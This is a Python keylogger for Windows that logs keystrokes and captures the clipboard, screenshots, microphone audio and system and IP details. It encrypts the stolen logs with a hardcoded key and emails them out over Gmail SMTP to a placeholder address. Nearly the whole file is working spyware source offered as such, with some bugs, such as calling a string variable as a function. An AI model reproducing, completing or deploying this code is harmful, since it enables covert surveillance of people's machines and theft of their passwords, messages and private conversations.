from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

logged_keystrokes = "logged_keystrokes.txt"

fromEmailAddress = "test.com"
fromEmailPassword = "test"
toEmailAddress = "test@gmail.com"

output_file_path = "C:\\test\\test\\test"

system_information = "SystemInformation.txt"

clipboard_information = "Clipboard.txt"

microphone_duration = 10
audio_data = "AudioData.wav"

screenshot = "Screenshot.png"

time_duration = 15
numIterationsTotal = 3

logged_keystrokes_encrypted = "logged_keystrokes_encrypted.txt"
system_information_encrypted = "system_information_encrypted.txt"
clipboard_information_encrypted = "clipboard_information_encrypted.txt"

key = "kNYK5uYa8aux5699sCcMecqqrv6Mr0Zm5lMsFkShtL0="

def sendEmail(filename, attachment, recepientAddress):
    message = MIMEMultipart()
    message['From'] = fromEmailAddress
    message['To'] = recepientAddress
    message['Subject'] = "Test Keylogger File"
    messageBody = "emailBody"
    message.attach(MIMEText(messageBody, 'plain'))

    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" %filename)
    message.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromEmailAddress, fromEmailPassword)
    text = message.as_string()

    s.sendmail(fromEmailAddress, toEmailAddress, text)
    s.quit()

#sendEmail(logged_keystrokes, output_file_path + "\\" + logged_keystrokes, toEmailAddress)

def retrieveSystemInformation():
    with open(output_file_path + "\\" + system_information, "a") as f:
        hostname = socket.gethostname();
        IPAddress = socket.gethostbyname(hostname)
        try:
            publicIPAddress = get("https://api.ipify.org").text 
            f.write("Public IP Address: " + publicIPAddress + " ")
        except Exception:
            f.write("Could not retrieve public IP address. ")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname " + hostname + '\n')
        f.write("Private IP Address: " + IPAddress + '\n')

#retrieveSystemInformation()

def retrieveClipboardContents ():
    with open(output_file_path + "\\" + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            clipboardContents = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Text Data: \n" + clipboardContents)
        except:
            f.write("Clipboard contains data that is not plaintext.")

#retrieveClipboardContents()

def retrieveMicrophoneInput():
    samplingFrequency = 44100
    duration = microphone_duration

    recording = sd.rec(int(duration * samplingFrequency), samplerate=samplingFrequency, channels=2)
    sd.wait()

    write(output_file_path + "\\" + audio_data, samplingFrequency, recording)

#retrieveMicrophoneInput()

def captureScreenshot():
    image = ImageGrab.grab()
    image.save(output_file_path + "\\" + screenshot);

#captureScreenshot()

numIterations = 0
currentTime = time.time()
endTime = time.time() + time_duration

while (numIterations < numIterationsTotal):

    count = 0
    keys_pressed = []

    def onKeyPress(key):
        global keys_pressed, count, currentTime

        print(key)
        keys_pressed.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeKeysPressedToFile(keys_pressed)
            keys_pressed = []

    def writeKeysPressedToFile(keys_pressed):
        with open (output_file_path + "\\" + logged_keystrokes, "a") as f:
            print(keys_pressed)
            for key in keys_pressed:
                parsedKey = str(key).replace("'", "")
                if (parsedKey.find("space") > 0):
                    f.write('\n')
                    f.close()
                elif (parsedKey.find("Key") == -1):
                    f.write(parsedKey)
                    f.close()

    def onKeyRelease(key):
        if key == Key.esc:
            return False
        if currentTime > endTime:
            return False

    with Listener(on_press = onKeyPress, on_release = onKeyRelease) as listener:
        listener.join()
    
    if currentTime > endTime:
        with open(output_file_path + "\\" + logged_keystrokes, "w") as f:
            f.write(" ")
        
        screenshot()
        retrieveClipboardContents()
        numIterations += 1
        currentTime = time.time()
        endTime = time.time() + time_duration

filesToEncrypt = [output_file_path + "\\" + system_information, output_file_path + "\\" + logged_keystrokes, output_file_path + "\\" + clipboard_information]
encryptedFileNames = [output_file_path + "\\" + system_information_encrypted, output_file_path + "\\" + logged_keystrokes_encrypted, output_file_path + "\\" + clipboard_information_encrypted]

count = 0

for file in filesToEncrypt:
    with open(file, "rb")as f:
        data = f.read()
    
    fernet = Fernet(key)
    encryptedData = fernet.encrypt(data)

    with open(encryptedFileNames[count], "wb") as f:
        f.write(encryptedData)

    sendEmail(encryptedFileNames[count], encryptedFileNames[count], toEmailAddress)
    count += 1

time.sleep(120)
